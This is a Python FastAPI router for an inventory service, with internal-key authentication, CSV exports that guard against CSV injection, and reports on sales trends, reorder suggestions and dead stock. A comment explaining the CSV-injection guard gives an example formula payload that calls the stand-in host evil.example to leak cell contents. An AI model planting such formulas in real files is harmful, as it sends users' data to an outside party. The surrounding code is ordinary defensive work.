from __future__ import annotations

import math
import secrets
from datetime import datetime, timedelta, timezone
from io import StringIO
from typing import Any, Optional

import pandas as pd
from fastapi import APIRouter, Depends, Header, HTTPException, Query
from fastapi.responses import Response
from sqlalchemy.engine import Connection

from app.config import settings
from app.db import get_db
from app.services.dead_stock import fetch_dead_stock
from app.services.export import fetch_movement_rows, fetch_products_rows, fetch_stock_rows
from app.services.reorder import fetch_reorder_candidates
from app.services.reports import fetch_sales_stock_trend

router = APIRouter()


# `Optional[str]`, not `str | None`. The `from __future__ import
# annotations` at the top of this module makes PEP 604 syntax *look* safe on
# any Python version, but FastAPI resolves parameter annotations at runtime
# to build the request model — so the union form raises on anything before
# 3.10, at import time, taking the whole test suite down at collection. The
# trap is that the failure is nowhere near the syntax that caused it.
def require_internal_caller(x_internal_key: Optional[str] = Header(default=None)) -> None:
    # secrets.compare_digest instead of `!=`: this key is the entire access
    # control story for the service (see test_internal_auth.py), and a
    # plain string comparison short-circuits on the first mismatched byte —
    # timing an attacker could use to recover the key one byte at a time.
    if x_internal_key is None or not secrets.compare_digest(x_internal_key, settings.internal_api_key):
        raise HTTPException(status_code=401, detail="Missing or invalid internal API key")


# CSV injection (CWE-1236): every export here carries free-text fields a
# Staff member can set (product/SKU/category/location names, a stock
# movement's `reason`), and the reader on the other end is an Owner opening
# the file in Excel/Sheets. A cell whose text starts with `=`, `+`, `-`, `@`,
# or a tab/CR is interpreted as a formula by those apps regardless of this
# API's own `text/csv` content type, so a value like `=HYPERLINK("http://
# evil.example/"&A1)` typed into an ADJUSTMENT reason runs the moment the
# export is opened. Only `str` values are touched — every numeric/bool/date
# field here (quantities, prices, a movement's own negative `quantity`) is
# already a native Python type by this point, not a stringified number, so
# the one legitimate case that starts with `-` is never in scope.
_DANGEROUS_CSV_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _sanitize_csv_value(value: Any) -> Any:
    if isinstance(value, str) and value.startswith(_DANGEROUS_CSV_PREFIXES):
        return "'" + value
    return value


def _sanitize_csv_rows(rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
    return [{key: _sanitize_csv_value(value) for key, value in row.items()} for row in rows]


def _csv_response(rows: list[dict[str, Any]], filename: str) -> Response:
    df = pd.DataFrame(_sanitize_csv_rows(rows))
    buffer = StringIO()
    df.to_csv(buffer, index=False)
    return Response(
        content=buffer.getvalue(),
        media_type="text/csv",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


# Shared by the dead-stock JSON report and its CSV export below, so the two
# can't quietly disagree on what "days since last sale" or "value tied up"
# means.
def _shape_dead_stock_row(row: dict[str, Any], now: datetime) -> dict[str, Any]:
    quantity = int(row["quantity_on_hand"])
    cost_cents = int(row["cost_cents"])
    last_sold_at = row["last_sold_at"]
    days_since_last_sale = None
    if last_sold_at is not None:
        # Rows come back timezone-aware from Postgres, but SQLite and a
        # hand-built test row may not; treating a naive timestamp as UTC
        # beats raising on the subtraction.
        reference = last_sold_at if last_sold_at.tzinfo else last_sold_at.replace(tzinfo=timezone.utc)
        days_since_last_sale = (now - reference).days
    return {
        "productId": row["product_id"],
        "sku": row["sku"],
        "name": row["name"],
        "quantityOnHand": quantity,
        "costCents": cost_cents,
        # What this row is actually costing: stock on hand valued at cost,
        # not at the price it is failing to sell for.
        "tiedUpValueCents": quantity * cost_cents,
        "lastSoldAt": last_sold_at.isoformat() if last_sold_at is not None else None,
        "daysSinceLastSale": days_since_last_sale,
    }


@router.get("/export/products", dependencies=[Depends(require_internal_caller)])
def export_products(
    organization_id: str = Query(...),
    include_cost: bool = Query(default=True),
    conn: Connection = Depends(get_db),
) -> Response:
    rows = fetch_products_rows(conn, organization_id)
    # Cost data is Owner-only (PRD §4: staff has "no access to cost/margin
    # data by default") — the Node proxy tells us who's asking via
    # include_cost rather than this service trying to know about roles.
    if not include_cost:
        rows = [{k: v for k, v in row.items() if k != "cost_cents"} for row in rows]
    return _csv_response(rows, "products.csv")


@router.get("/export/stock", dependencies=[Depends(require_internal_caller)])
def export_stock(organization_id: str = Query(...), conn: Connection = Depends(get_db)) -> Response:
    rows = fetch_stock_rows(conn, organization_id)
    return _csv_response(rows, "stock.csv")


@router.get("/export/movements", dependencies=[Depends(require_internal_caller)])
def export_movements(
    organization_id: str = Query(...),
    days: int = Query(default=30, ge=1, le=365),
    conn: Connection = Depends(get_db),
) -> Response:
    since = datetime.now(timezone.utc) - timedelta(days=days)
    rows = fetch_movement_rows(conn, organization_id, since)
    return _csv_response(rows, "movements.csv")


@router.get("/export/dead-stock", dependencies=[Depends(require_internal_caller)])
def export_dead_stock(
    organization_id: str = Query(...),
    days: int = Query(default=90, ge=7, le=730),
    conn: Connection = Depends(get_db),
) -> Response:
    # No `limit` here, unlike the JSON report: a CSV an owner is about to
    # hand to a supplier or file away should be the whole list, not the page
    # a dashboard panel can fit on screen. Same shaping as the JSON route via
    # `_shape_dead_stock_row`, so the two can't disagree on the numbers.
    now = datetime.now(timezone.utc)
    since = now - timedelta(days=days)
    rows = [_shape_dead_stock_row(row, now) for row in fetch_dead_stock(conn, organization_id, since)]
    csv_rows = [
        {
            "sku": row["sku"],
            "name": row["name"],
            "quantity_on_hand": row["quantityOnHand"],
            "cost_cents": row["costCents"],
            "tied_up_value_cents": row["tiedUpValueCents"],
            "last_sold_at": row["lastSoldAt"],
            "days_since_last_sale": row["daysSinceLastSale"],
        }
        for row in rows
    ]
    return _csv_response(csv_rows, "dead-stock.csv")


@router.get("/reports/trend", dependencies=[Depends(require_internal_caller)])
def sales_stock_trend(
    organization_id: str = Query(...),
    days: int = Query(default=7, ge=1, le=365),
    conn: Connection = Depends(get_db),
) -> dict:
    since = datetime.now(timezone.utc) - timedelta(days=days)
    rows = fetch_sales_stock_trend(conn, organization_id, since)
    series = [
        {
            "date": row["day"].isoformat() if hasattr(row["day"], "isoformat") else str(row["day"]),
            "unitsSold": int(row["units_sold"]),
            "unitsReceived": int(row["units_received"]),
            "revenueCents": int(row["revenue_cents"]),
        }
        for row in rows
    ]
    totals = {
        "unitsSold": sum(item["unitsSold"] for item in series),
        "unitsReceived": sum(item["unitsReceived"] for item in series),
        "revenueCents": sum(item["revenueCents"] for item in series),
    }
    return {"days": days, "series": series, "totals": totals}


# F12: reorder-quantity suggestion (moving-average demand). Only products
# already at/under their reorder point are considered (same "low stock"
# definition F8 uses on the Node dashboard) — avgDailyDemand comes from
# trailing units sold over `days`, and suggestedQty targets enough stock to
# cover `coverageDays` of that demand, floored at the product's own
# reorderQty so the suggestion never undercuts what the owner already
# configured as their standard reorder amount.
@router.get("/reports/reorder-suggestions", dependencies=[Depends(require_internal_caller)])
def reorder_suggestions(
    organization_id: str = Query(...),
    days: int = Query(default=30, ge=1, le=365),
    coverage_days: int = Query(default=14, ge=1, le=90),
    conn: Connection = Depends(get_db),
) -> dict:
    since = datetime.now(timezone.utc) - timedelta(days=days)
    rows = fetch_reorder_candidates(conn, organization_id, since)

    items = []
    for row in rows:
        current_stock = int(row["current_stock"])
        units_sold = int(row["units_sold"])
        avg_daily_demand = units_sold / days
        days_of_stock_remaining = current_stock / avg_daily_demand if avg_daily_demand > 0 else None
        target_stock = math.ceil(avg_daily_demand * coverage_days)
        suggested_qty = max(int(row["reorder_qty"]), target_stock - current_stock, 0)
        items.append(
            {
                "productId": row["product_id"],
                "sku": row["sku"],
                "name": row["name"],
                "currentStock": current_stock,
                "reorderPoint": int(row["reorder_point"]),
                "reorderQty": int(row["reorder_qty"]),
                "avgDailyDemand": round(avg_daily_demand, 2),
                "daysOfStockRemaining": round(days_of_stock_remaining, 1)
                if days_of_stock_remaining is not None
                else None,
                "suggestedQty": suggested_qty,
            }
        )

    items.sort(
        key=lambda item: item["daysOfStockRemaining"] if item["daysOfStockRemaining"] is not None else float("inf")
    )
    return {"days": days, "coverageDays": coverage_days, "items": items}


# Dead stock: what is sitting on the shelf that nobody is buying. The
# product has always been able to say what is about to run out; this is the
# opposite question, and for a small shop it is the one with money attached.
# Owner-only at the Node proxy, because every row carries cost.
@router.get("/reports/dead-stock", dependencies=[Depends(require_internal_caller)])
def dead_stock(
    organization_id: str = Query(...),
    days: int = Query(default=90, ge=7, le=730),
    limit: int = Query(default=50, ge=1, le=500),
    conn: Connection = Depends(get_db),
) -> dict:
    now = datetime.now(timezone.utc)
    since = now - timedelta(days=days)
    rows = fetch_dead_stock(conn, organization_id, since)

    items = [_shape_dead_stock_row(row, now) for row in rows[:limit]]

    return {
        "days": days,
        "items": items,
        "totals": {
            # Totals cover every dead product, not just the page returned, so
            # a truncated list still reports the real figure rather than a
            # reassuring fraction of it.
            "productCount": len(rows),
            "tiedUpValueCents": sum(
                int(row["quantity_on_hand"]) * int(row["cost_cents"]) for row in rows
            ),
        },
    }
